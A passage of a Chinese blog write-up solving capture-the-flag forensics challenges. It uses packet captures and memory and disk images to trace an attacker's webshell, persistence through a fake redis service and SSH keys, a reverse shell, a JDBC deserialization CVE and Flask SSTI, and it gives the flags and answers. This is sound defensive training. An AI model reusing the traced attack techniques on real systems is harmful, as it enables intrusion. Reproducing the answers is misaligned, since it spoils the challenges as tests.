+<p>攻击者发起攻击时的user-agent是多少？</p>
+</blockquote>
+<p>攻击成功明显就是200的状态码</p>
+<p><img src="/posts/8dc02fc6/images/image-20250902152420434.png" alt="image-20250902152420434"></p>
+<p>筛选200状态码，拿到UA</p>
+<blockquote>
+<p>echo -n ‘mozilla&#x2F;5.0(compatible;baiduspider&#x2F;2.0;+<a target="_blank" rel="noopener" href="http://www.baidu.com/search/spider.html">http://www.baidu.com/search/spider.html</a>)’ | md5sum | cut -d ‘’ -f1</p>
+<p>6ba8458f11f4044cce7a621c085bb3c6</p>
+</blockquote>
+<h3 id="题目6攻击者使用的权限维持手段"><a href="#题目6攻击者使用的权限维持手段" class="headerlink" title="题目6攻击者使用的权限维持手段"></a>题目6攻击者使用的权限维持手段</h3><p>题目：</p>
+<blockquote>
+<p>攻击者使用了两种权限维持手段，相应的路径是？</p>
+</blockquote>
+<ul>
+<li>第一个就是我们上面的redis伪装</li>
+<li>我们首先排查redis的服务<ul>
+<li><img src="/posts/8dc02fc6/images/image-20250902211555984.png" alt="image-20250902211555984"></li>
+</ul>
+</li>
+<li>锁定redis的路径，<code>/lib/systemd/system/redis.service</code></li>
+</ul>
+<blockquote>
+<p>echo -n ‘&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;redis.service’ | md5sum | cut -d ‘’ -f1</p>
+<p>b2c5af8ce08753894540331e5a947d35</p>
+</blockquote>
+<h3 id="题目7第二种权限维持手段"><a href="#题目7第二种权限维持手段" class="headerlink" title="题目7第二种权限维持手段"></a>题目7第二种权限维持手段</h3><p>题目：</p>
+<blockquote>
+<p>攻击者使用了两种权限维持手段，相应的路径是？</p>
+</blockquote>
+<p>权限维持排查的手段，其中一种就是ssh手段伪装，攻击者通过在服务器放置公钥文件，客户端放置私钥文件，可以直接ssh连接</p>
+<ul>
+<li><p>这里我们首先排查root目录下的.ssh</p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250902212707350.png" alt="image-20250902212707350"></p>
+</li>
+<li><p>root@kali，如果采用ssh密钥对权限维持，最后部分就是user@attachermachine</p>
+</li>
+</ul>
+<blockquote>
+<p>echo -n ‘&#x2F;root&#x2F;.ssh&#x2F;authorized_keys’ | md5sum | cut -d ‘’ -f1</p>
+<p>a1fa1b5aeb1f97340032971c342c4258</p>
+</blockquote>
+<h2 id="SmallSword"><a href="#SmallSword" class="headerlink" title="SmallSword"></a>SmallSword</h2><h3 id="题目1连接蚁剑的密码"><a href="#题目1连接蚁剑的密码" class="headerlink" title="题目1连接蚁剑的密码"></a>题目1连接蚁剑的密码</h3><p>题目：</p>
+<blockquote>
+<p>连接蚁剑的密码是？</p>
+</blockquote>
+<p>清楚蚁剑默认是通过明文传输而且标志十分明显、</p>
+<p>首先筛选http协议</p>
+<p><img src="/posts/8dc02fc6/images/image-20250902215235601.png" alt="image-20250902215235601"></p>
+<p>熟悉sqli注入和php伪协议的应该一眼顶针</p>
+<p>追踪数据流</p>
+<p><img src="/posts/8dc02fc6/images/image-20250902215430553.png" alt="image-20250902215430553"></p>
+<p>url解码或者丢给ai</p>
+<blockquote>
+<p>6ea280898e404bfabd0ebb702327b18f</p>
+</blockquote>
+<h3 id="题目2攻击者留存的值"><a href="#题目2攻击者留存的值" class="headerlink" title="题目2攻击者留存的值"></a>题目2攻击者留存的值</h3><p>题目：</p>
+<blockquote>
+<p>攻击者留存的值是</p>
+</blockquote>
+<p>依然是翻找蚁剑的操作</p>
+<p><img src="/posts/8dc02fc6/images/image-20250902222857007.png" alt="image-20250902222857007"></p>
+<p>找到留存信息，这个蚁剑流量的作用是查看hacker.txt</p>
+<p>但是这个格式不对，说明后面可能修改了hacker.txt，接着往后面翻，找到了</p>
+<p><img src="/posts/8dc02fc6/images/image-20250902224329314.png" alt="image-20250902224329314"></p>
+<p>作用是文件写入操作，目的是将字符串base64编码的字符串解码之后写入到 <code>hacker.txt</code> 文件中。</p>
+<p>解码之后得到</p>
+<blockquote>
+<p>ad6269b7-3ce2-4ae8-b97f-f259515e7a91 </p>
+</blockquote>
+<h3 id="题目3攻击者的flag"><a href="#题目3攻击者的flag" class="headerlink" title="题目3攻击者的flag"></a>题目3攻击者的flag</h3><p>题目：</p>
+<blockquote>
+<p>攻击者下载到的flag是</p>
+</blockquote>
+<p>前面流量包分析有一个是下载了huorong.exe的流量</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903094625644.png" alt="image-20250903094625644"></p>
+<p>这个操作就是下载或者运行了hongrong.exe这个程序</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903094543627.png" alt="image-20250903094543627"></p>
+<p>把这个数据流量导出</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903094804388.png" alt="image-20250903094804388"></p>
+<p>按照数据大小排序，第一个就是的</p>
+<img src ="images/image-20250903094853599.png" alt="image-20250903094853599" style="zoom:50%;" />
+
+<p>导出之后使用010查看，把蚁剑的识别头<code>-&gt;|</code>删去,，保存为exe文件</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903095051643.png" alt="image-20250903095051643"></p>
+<p>可以看到还是用pyinstalliner打包的，运行之后会在上一层目录拿到一张图片</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903095151358.png" alt="image-20250903095151358"></p>
+<p>修复宽高之后得到flag</p>
+<img src ="images/image-20250903095212161.png" alt="image-20250903095212161" style="zoom:50%;" />
+
+<blockquote>
+<p>flag3{8f0dffac-5801-44a9-bd49-e66192ce4f57}</p>
+</blockquote>
+<h2 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h2><h3 id="题目1服务器自带的后门文件"><a href="#题目1服务器自带的后门文件" class="headerlink" title="题目1服务器自带的后门文件"></a>题目1服务器自带的后门文件</h3><p>题目：</p>
+<blockquote>
+<p>服务器自带的后门文件是什么？</p>
+</blockquote>
+<p>直接筛选http协议，发现d00r.php文件一直在执行命令</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903102041302.png" alt="image-20250903102041302"></p>
+<p>结果不是d00r.php这个文件，那直接查找看有没有什么上传了d00r了</p>
+<p>成功找到ViewMore.php上传了这个木马(这里使用wireshark自带的查找或者使用<code>http contains &quot;d00r&quot;</code>规则查找都行)</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903102232916.png" alt="image-20250903102232916"></p>
+<blockquote>
+<p>ViewMore.php</p>
+</blockquote>
+<h3 id="题目2服务器的内网ip"><a href="#题目2服务器的内网ip" class="headerlink" title="题目2服务器的内网ip"></a>题目2服务器的内网ip</h3><p>题目：</p>
+<blockquote>
+<p>服务器的内网ip是多少</p>
+</blockquote>
+<p>192.168.162.130不是题目想要的，那就是攻击者执行了ip之类的命令</p>
+<p>成功找到ifconfig命令执行</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903103337737.png" alt="image-20250903103337737"></p>
+<blockquote>
+<p>192.168.101.132</p>
+</blockquote>
+<h3 id="题目3攻击者写入的key"><a href="#题目3攻击者写入的key" class="headerlink" title="题目3攻击者写入的key"></a>题目3攻击者写入的key</h3><p>题目：</p>
+<blockquote>
+<p>攻击者往服务器中写入的key是什么？</p>
+</blockquote>
+<p>还是追踪最后部分命令执行的http数据流，成功找到写入文件操作(最后一个流量)</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903110443285.png" alt="image-20250903110443285"></p>
+<p>base64解码转16进制</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903110536659.png" alt="image-20250903110536659"></p>
+<p>文件头是zip包，用010创建16进制，ctrl+shift+v粘贴保存为zip文件即可</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903110626946.png" alt="image-20250903110626946"></p>
+<p>但是zip包被加密了，接着看前面的流量，发现查看passwd</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903110737058.png" alt="image-20250903110737058"></p>
+<p>passwd提交解密成功</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903110759437.png" alt="image-20250903110759437"></p>
+<blockquote>
+<p>7d9ddff2-2d67-4eba-9e48-b91c26c42337</p>
+</blockquote>
+<h2 id="baby-forensics"><a href="#baby-forensics" class="headerlink" title="baby_forensics"></a>baby_forensics</h2><h3 id="题目1磁盘中的key"><a href="#题目1磁盘中的key" class="headerlink" title="题目1磁盘中的key"></a>题目1磁盘中的key</h3><p>题目：</p>
+<blockquote>
+<p>磁盘中的key是多少？</p>
+</blockquote>
+<p>题目给了两个文件，一个是raw文件，一个是vmdk文件，猜测一个是内存文件，一个是虚拟磁盘文件，虚拟磁盘文件被BitLocker锁住了，猜测密码是在raw文件里面</p>
+<p>使用axiom直接分析raw文件</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903181304452.png" alt="image-20250903181304452"></p>
+<p>直接拿到BitLocker恢复密钥，diskgenius挂载磁盘</p>
+<p>里面有一个key.txt，但是内容被加密了</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903181352343.png" alt="image-20250903181352343"></p>
+<p>直接把内容放到随波逐流一把梭</p>
+<img src ="images/image-20250903181456268.png" alt="image-20250903181456268" style="zoom:50%;" />
+
+<p>成功拿到key</p>
+<blockquote>
+<p>2e803070 85fd2b5c49c968c323ee25d5</p>
+</blockquote>
+<h3 id="题目2电脑中运行的计算器的运行结果"><a href="#题目2电脑中运行的计算器的运行结果" class="headerlink" title="题目2电脑中运行的计算器的运行结果"></a>题目2电脑中运行的计算器的运行结果</h3><p>题目：</p>
+<blockquote>
+<p>电脑中正在运行的计算器的运行结果是多少？</p>
+</blockquote>
+<p>内存取证用volatility2</p>
+<ul>
+<li><p>先看内存是什么profile</p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250903205740132.png" alt="image-20250903205740132"></p>
+</li>
+<li><p>然后查找计算器的进程</p>
+<ul>
+<li><img src="/posts/8dc02fc6/images/image-20250903205845285.png" alt="image-20250903205845285"></li>
+</ul>
+</li>
+<li><p>进程图片调出不来，换方法了，把Windows窗口信息调出来</p>
+<ul>
+<li><img src="/posts/8dc02fc6/images/image-20250903210100232.png" alt="image-20250903210100232"></li>
+</ul>
+</li>
+<li><p>查找calc.exe即可</p>
+<ul>
+<li><img src="/posts/8dc02fc6/images/image-20250903210131705.png" alt="image-20250903210131705"></li>
+</ul>
+</li>
+</ul>
+<p>拿到计算器结果</p>
+<blockquote>
+<p>7598632541</p>
+</blockquote>
+<h3 id="题目3该内存文件的flag"><a href="#题目3该内存文件的flag" class="headerlink" title="题目3该内存文件的flag"></a>题目3该内存文件的flag</h3><p>题目：</p>
+<blockquote>
+<p>该内存文件中存在的flag值是多少？</p>
+</blockquote>
+<p>axiom查看到有加密内容文件</p>
+<img src ="images/image-20250903221324887.png" alt="image-20250903221324887" style="zoom:50%;" />
+
+<p>文本内容base64解密一下</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903221405265.png" alt="image-20250903221405265"></p>
+<p>盐值打头说明是aes加密，接着在内存里面查找key，k3y，passwd，password关键字</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903221545340.png" alt="image-20250903221545340"></p>
+<p>导出查看文件</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903221611854.png" alt="image-20250903221611854"></p>
+<p>最后aes解密，拿到flag</p>
+<p><img src="/posts/8dc02fc6/images/image-20250903221923612.png" alt="image-20250903221923612"></p>
+<blockquote>
+<p>flag{ad9bca48-c7b0-4bd6-b6fb-aef90090bb98}</p>
+</blockquote>
+<h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><h3 id="题目1攻击者的用户名和登录密码"><a href="#题目1攻击者的用户名和登录密码" class="headerlink" title="题目1攻击者的用户名和登录密码"></a>题目1攻击者的用户名和登录密码</h3><p>题目：</p>
+<blockquote>
+<p>攻击者通过暴力破解进入了某wiki文档，请给出登录的用户名和密码，以:拼接</p>
+</blockquote>
+<p>攻击者先扫描目录，然后尝试爆破登录，爆破登录的账号是TMjpxFGQwD</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904123323685.png" alt="image-20250904123323685"></p>
+<p>发现爆破失败，返回响应的长度为237</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904123423425.png" alt="image-20250904123423425"></p>
+<p>那直接修改规则为响应长度不为237即可</p>
+<blockquote>
+<p>http &amp;&amp; frame.len!&#x3D;237</p>
+</blockquote>
+<p><img src="/posts/8dc02fc6/images/image-20250904123528396.png" alt="image-20250904123528396"></p>
+<p>或者根据返回内容筛选</p>
+<blockquote>
+<p>http &amp;&amp; http contains “&quot;errCode&quot;:200”</p>
+</blockquote>
+<p><img src="/posts/8dc02fc6/images/image-20250904123958833.png" alt="image-20250904123958833"></p>
+<p>成功拿到爆破账号和密码</p>
+<blockquote>
+<p>TMjpxFGQwD:123457</p>
+</blockquote>
+<h3 id="题目2攻击者越权的cookie"><a href="#题目2攻击者越权的cookie" class="headerlink" title="题目2攻击者越权的cookie"></a>题目2攻击者越权的cookie</h3><p>题目：</p>
+<blockquote>
+<p>攻击者发现软件存在越权漏洞，请给出攻击者越权使用的cookie的内容的md5值</p>
+</blockquote>
+<p>登录时cookie为<code>accessToken=f412d3a0378d42439ee016b06ef3330c; zyplayertoken=f412d3a0378d42439ee016b06ef3330cQzw=; userid=2</code>，下面这个时候已经发现越权漏洞了，抓包进行修改id即可查看管理员界面的评论，但是cookie没有修改</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904130203069.png" alt="image-20250904130203069"></p>
+<p>这里直接把userid改为2了</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904130522095.png" alt="image-20250904130522095"></p>
+<p>那就是这个cookie了</p>
+<blockquote>
+<p>accessToken&#x3D;f412d3a0378d42439ee016b06ef3330c; zyplayertoken&#x3D;f412d3a0378d42439ee016b06ef3330cQzw&#x3D;; userid&#x3D;1</p>
+<p>383c74db4e32513daaa1eeb1726d7255</p>
+</blockquote>
+<h3 id="题目3获取攻击者的jdbc的数据库账号密码"><a href="#题目3获取攻击者的jdbc的数据库账号密码" class="headerlink" title="题目3获取攻击者的jdbc的数据库账号密码"></a>题目3获取攻击者的jdbc的数据库账号密码</h3><p>题目：</p>
+<blockquote>
+<p>攻击者使用jdbc漏洞读取了应用配置文件，给出配置中的数据库账号密码，以:拼接</p>
+</blockquote>
+<p>先抓到攻击者尝试利用jdbc的反序列化写入shell</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904162634566.png" alt="image-20250904162634566"></p>
+<p>后面成功抓到攻击者的shell内容，是一个反弹shell</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904162857159.png" alt="image-20250904162857159"></p>
+<p>根据反弹shell，攻击者可能走tcp协议，直接筛选tcp的规则</p>
+<blockquote>
+<p>tcp contains “username” &amp;&amp; tcp contains “password”</p>
+</blockquote>
+<p>一眼顶针这个反弹shell的ip，追踪tcp流</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904163324411.png" alt="image-20250904163324411"></p>
+<img src ="images/image-20250904163438209.png" alt="image-20250904163438209"  />
+
+<p>成功拿到账号密码</p>
+<blockquote>
+<p>zyplayer:1234567</p>
+</blockquote>
+<h3 id="题目4攻击者执行漏洞的CVE和EXP文件名"><a href="#题目4攻击者执行漏洞的CVE和EXP文件名" class="headerlink" title="题目4攻击者执行漏洞的CVE和EXP文件名"></a>题目4攻击者执行漏洞的CVE和EXP文件名</h3><p>题目：</p>
+<blockquote>
+<p>攻击者使用了CVE漏洞攻击应用，执行系统命令，请给出CVE编号以及远程EXP的文件名，使用:拼接</p>
+</blockquote>
+<p>题目3我们已经分析了是利用的jdbc的反序列化写入shell</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904162634566.png" alt="image-20250904162634566"></p>
+<p>网上搜索cve和对应的payload即可得到cve编号</p>
+<blockquote>
+<p>cve org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg</p>
+<p>CVE-2022-21724:custom.dtd.xml</p>
+</blockquote>
+<h3 id="题目5攻击者下载的工具"><a href="#题目5攻击者下载的工具" class="headerlink" title="题目5攻击者下载的工具"></a>题目5攻击者下载的工具</h3><p>题目：</p>
+<blockquote>
+<p>给出攻击者获取系统权限后，下载的工具的名称</p>
+</blockquote>
+<p>直接筛选攻击者的ip</p>
+<blockquote>
+<p><code>ip.addr ==116.62.63.234 || ip.dst==116.62.63.234</code></p>
+</blockquote>
+<p>从末尾追踪tcp流，一眼顶针</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904164637223.png" alt="image-20250904164637223"></p>
+<blockquote>
+<p>fscan</p>
+</blockquote>
+<h2 id="hacked"><a href="#hacked" class="headerlink" title="hacked"></a>hacked</h2><h3 id="题目1admin用户的密码"><a href="#题目1admin用户的密码" class="headerlink" title="题目1admin用户的密码"></a>题目1admin用户的密码</h3><p>题目：</p>
+<blockquote>
+<p>admin用户的密码是什么？</p>
+</blockquote>
+<p>wireshark直接搜索admin</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904165813686.png" alt="image-20250904165813686"></p>
+<p>发现加密了，有可能是前端加密，看有没有访问前端页面的，结果第一个就是</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904165918660.png" alt="image-20250904165918660"></p>
+<p>前端直接告诉我们了aes的cbc加密，pkcs7填充</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904170006605.png" alt="image-20250904170006605"></p>
+<blockquote>
+<p>flag{WelC0m5_TO_H3re}</p>
+</blockquote>
+<h3 id="题目2app-config-‘SECRET-KEY’-的值"><a href="#题目2app-config-‘SECRET-KEY’-的值" class="headerlink" title="题目2app.config[‘SECRET_KEY’]的值"></a>题目2app.config[‘SECRET_KEY’]的值</h3><p>题目：</p>
+<blockquote>
+<p>app.config[‘SECRET_KEY’]的值是多少？</p>
+</blockquote>
+<p>接着往下找，发现一个长度明显不对的</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904170629033.png" alt="image-20250904170629033"></p>
+<p>追踪http流看一眼，一眼顶针</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904170707939.png" alt="image-20250904170707939"></p>
+<blockquote>
+<p>ssti_flask_hsfvaldb</p>
+</blockquote>
+<h3 id="题目3flask由哪个用户启动"><a href="#题目3flask由哪个用户启动" class="headerlink" title="题目3flask由哪个用户启动"></a>题目3flask由哪个用户启动</h3><p>题目：</p>
+<blockquote>
+<p>flask网站由哪个用户启动</p>
+</blockquote>
+<p>前面一题提示我们是ssti注入，我们观察每个流量细节，cookie都会有明显变化，应该是session伪造的ssti注入，后面观察流量，发现有一个无回显（hello没有接值）</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904174955675.png" alt="image-20250904174955675"></p>
+<p>但是有一个set-cookie，明显不对劲，解密request看一下</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904175054005.png" alt="image-20250904175054005"></p>
+<p>发现执行了whoami命令，解密respone看一下</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904175154318.png" alt="image-20250904175154318"></p>
+<p>成功拿到用户名</p>
+<blockquote>
+<p>red</p>
+</blockquote>
+<h3 id="题目4攻击者写入的内存马"><a href="#题目4攻击者写入的内存马" class="headerlink" title="题目4攻击者写入的内存马"></a>题目4攻击者写入的内存马</h3><p>题目:</p>
+<blockquote>
+<p>攻击者写入的内存马的路由名叫什么？</p>
+</blockquote>
+<p>接着往后翻流量，看到长的就解密看一下，这个返回none的就很可疑</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904175716392.png" alt="image-20250904175716392"></p>
+<p>解密之后发现写入内存马路由</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904175748558.png" alt="image-20250904175748558"></p>
+<p>这里攻击者还访问了一次，测试是否写入成功</p>
+<p><img src="/posts/8dc02fc6/images/image-20250904175835225.png" alt="image-20250904175835225"></p>
+<blockquote>
+<p>Index</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://0xyyssh.github.io">yyssh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://0xyyssh.github.io/posts/8dc02fc6.html">https://0xyyssh.github.io/posts/8dc02fc6.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://0xyyssh.github.io" target="_blank">yyssh's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WP/">WP</a></div><div class="post-share"><div class="social-share" data-image="/coverimages/default_bg19.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://lib.baomitu.com/social-share.js/1.0.16/css/share.min.css" media="print" onload="this.media='all'"><script src="https://lib.baomitu.com/social-share.js/1.0.16/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/d071fe4b.html" title="hexoLearn"><img class="cover" src="/coverimages/default_bg22.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">hexoLearn</div></div><div class="info-2"><div class="info-item-1">Hexo语法学习hexo的目录映射  当我们下载好了hexo之后，会得到一个hexo的目录，下面是目录的解析 1234567891011your-hexo-site/├── _config.yml          # 站点全局配置文件├── package.json         # 依赖和脚本├── scaffolds/           # 模板文件（post/page/draft 的默认格式）├── source/              # 所有源内容（最终生成网站的“原料”）│   ├── _posts/          # 博客文章（.md 文件）│   ├── _drafts/         # 草稿（未发布）│   ├── about/           # 自定义页面（如 about/index.md）│   └── images/          # 【推荐】存放全局图片或附件（可自定义）├── themes/              # 主题目录└── public/              # `hexo generate` 生成的静态...</div></div></div></a><a class="pagination-related" href="/posts/7d288577.html" title="2025蓝桥杯全国总决赛部分WP"><img class="cover" src="/coverimages/default_bg2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">2025蓝桥杯全国总决赛部分WP</div></div><div class="info-2"><div class="info-item-1">2025蓝桥杯全国总决赛部分WPxxtea下载附件打开是cyberchef的一个加密步骤（当时半决也有一个差不多的题）  按F12拿到输出  1234567800000000 9e 45 02 82 ea 25 d2 62 0d 06 e7 b4 5f dc 62 bd |.E...%.b...._.b.|00000010 39 68 47 26 54 50 9e 26 4c 86 06 2e 2b af 3b 8b |9hG&amp;TP.&amp;L...+.;.|00000020 7c e4 99 0d ad 12 e2 7e 46 c9 00 29 a6 ea 1f b0 ||......~F..)....|00000030 ae c1 da 30 f3 98 94 82 33 fd 99 d3 d3 b9 a0 12 |...0....3.......|00000040 d9 de a5 d2 0e 95 f3 a5 bb f2 f9 91 b2 a3 c2 94 |................|00000050 b1 1c b7 eb 87 65 d7 0e 0c...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/a691451b.html" title="2025ISCC区域赛Misc-WP"><img class="cover" src="/coverimages/default_bg20.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-19</div><div class="info-item-2">2025ISCC区域赛Misc-WP</div></div><div class="info-2"><div class="info-item-1">ISCC2025区域赛Misc-WP比赛感受ISCC出的misc题倒是各个方面都涉及到了（所以这就是你misc题套web前端出web题的理由吗？），图片隐写，音频隐写，内存取证，多多少少都考了一些，就是最近很多misc都考流量分析去了，ISCC没有出这方面的题（感觉是没有攻防经验啊，所以web出的依托），总的来说中规中矩 Misc+返校之路下载附件之后是两个文件  第一个是伪加密，用高级一点的解压工具可以直接解压，没有的话，就丢进随波逐流里面一把梭 第一个压缩包打开之后是一个提示  第二个压缩包其实硬爆破也能出来，就是耗时间，这里直接用掩码爆破快一点，掩码就是提示的bfs???  这里用工具ARCHPR,拿到第二个压缩包密码bfsCXC 第二个压缩包打开是三张图片 1.jpg:朝阳站A 3.jpg:北京地铁线路图 查看图片描述   提示路上换乘站数 picture2.png:魏公村站 用zsteg获取到密文flag  四个等号，明显就是base32加密 KIYGI6STIZFHGZCXMM6Q&#x3D;&#x3D;&#x3D;&#x3D; base32解密：  R0dzSFJs...</div></div></div></a><a class="pagination-related" href="/posts/6213db3a.html" title="知攻善防WP"><img class="cover" src="/coverimages/default_bg12.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-04</div><div class="info-item-2">知攻善防WP</div></div><div class="info-2"><div class="info-item-1">Webweb渗透1前景需要：小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，这是他的服务器系统，请你找出以下内容，并作为通关条件： 1.攻击者的shell密码2.攻击者的IP地址3.攻击者的隐藏账户名称4.攻击者挖矿程序的矿池域名 用户：administrator密码Zgsf@admin.com 第一个要找到shell密码，那我们首先就要找到shell，两种办法 第一个直接用工具扫网站根目录（小皮面板打开） 第二个手动分析日志文件   工具:D盾、河马    phpstud的yapache2的日志文件在C:\phpstudy_pro\Extensions\Apache2.4.39\logs 手动分析access.log.1708905600，发现明显木马痕迹     可以看到木马在网站根目录下的&#x2F;content&#x2F;plugins&#x2F;tips&#x2F; 打开木马文件进行分析 123456789101112131415161718192021222324252627&lt;?php@error_reporting(0);sessi...</div></div></div></a><a class="pagination-related" href="/posts/7d288577.html" title="2025蓝桥杯全国总决赛部分WP"><img class="cover" src="/coverimages/default_bg2.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-24</div><div class="info-item-2">2025蓝桥杯全国总决赛部分WP</div></div><div class="info-2"><div class="info-item-1">2025蓝桥杯全国总决赛部分WPxxtea下载附件打开是cyberchef的一个加密步骤（当时半决也有一个差不多的题）  按F12拿到输出  1234567800000000 9e 45 02 82 ea 25 d2 62 0d 06 e7 b4 5f dc 62 bd |.E...%.b...._.b.|00000010 39 68 47 26 54 50 9e 26 4c 86 06 2e 2b af 3b 8b |9hG&amp;TP.&amp;L...+.;.|00000020 7c e4 99 0d ad 12 e2 7e 46 c9 00 29 a6 ea 1f b0 ||......~F..)....|00000030 ae c1 da 30 f3 98 94 82 33 fd 99 d3 d3 b9 a0 12 |...0....3.......|00000040 d9 de a5 d2 0e 95 f3 a5 bb f2 f9 91 b2 a3 c2 94 |................|00000050 b1 1c b7 eb 87 65 d7 0e 0c...</div></div></div></a><a class="pagination-related" href="/posts/57b6e4e.html" title="CTFshow_misc_WP"><img class="cover" src="/coverimages/default_bg9.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-19</div><div class="info-item-2">CTFshow_misc_WP</div></div><div class="info-2"><div class="info-item-1">CTFshow_MiscWp前言本人是在web入门篇写到128题左右开始也刷Misc的题目了，因为现在CTF挑战中，Web与Misc大量的牵扯了进来，Misc又由于本身的解密性，从而增加了一个Web题目的趣味性，也更加的符合实战场景，就我目前的水平而言，Web刷的题都是简单的php代码审计，也想换一个放松心情（~找虐~） 不要固定思维，多找找意想不到的地方Misc入门Misc-01解压即有，拿个图片文字工具(qq截图就有)把flag提取出来 Misc-02打开txt文件看一眼，有图片头png，改文件后缀.png，然后和第一关一样 Misc-03一种稀奇古怪的图片格式，网络上还没有在线转换器，下一个honeyview&#x2F;bpgview查看器查看就可以得到图片 Misc-04这不得不说honeyview工具的强大了，这几个txt文件用honeyview工具打开就可以得到图片，再用工具查看，可以得到图片格式分别为png、jpeg(正常打开txt文件可以知道这张图还用Ps改了)、bmp、gif、tiff、webp 1ctfshow&#123;4314e2b15ad9a960e7d...</div></div></div></a><a class="pagination-related" href="/posts/8087d2e8.html" title="CTFshow_web_WP"><img class="cover" src="/coverimages/default_bg22.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-19</div><div class="info-item-2">CTFshow_web_WP</div></div><div class="info-2"><div class="info-item-1">CTFshow-Web-WP工具不是万能的Web入门信息收集web-11开发者开发不仔细,注释留在了前端界面,通过检查界面源代码发现漏洞和flag,得到的flag可能是编码之前的,所以需要进行base64解码或者其他方式解码  web-212前端进行限制,无法查看页面源代码或者检查,通过view-source:url可以查看源代码 通过不断刷新进行F12检查也可以开启代码检查,然后禁用JavaScript  web-31通过BP抓包,respond返回请求携带信息泄露（flag）  web-4&#x3D;&#x3D;#如果是有明显的网站架构，可以优先扫描robots文件&#x3D;&#x3D; 1网页搜索引擎爬取网站的robots(.txt)文件,所以网站robots(.txt)文件也会信息泄露(flag)  web-51phps文件泄露,若目录扫描到,通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。因为用户无法直接通过Web浏览器“看到”php文件的内容,所以需要用phps文件代替。用户访问phps文件就能看到对应的php文件的源码。其中可能有flag  ...</div></div></div></a><a class="pagination-related" href="/posts/9cd054c0.html" title="2025ISCC区域赛Web-WP"><img class="cover" src="/coverimages/default_bg10.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-19</div><div class="info-item-2">2025ISCC区域赛Web-WP</div></div><div class="info-2"><div 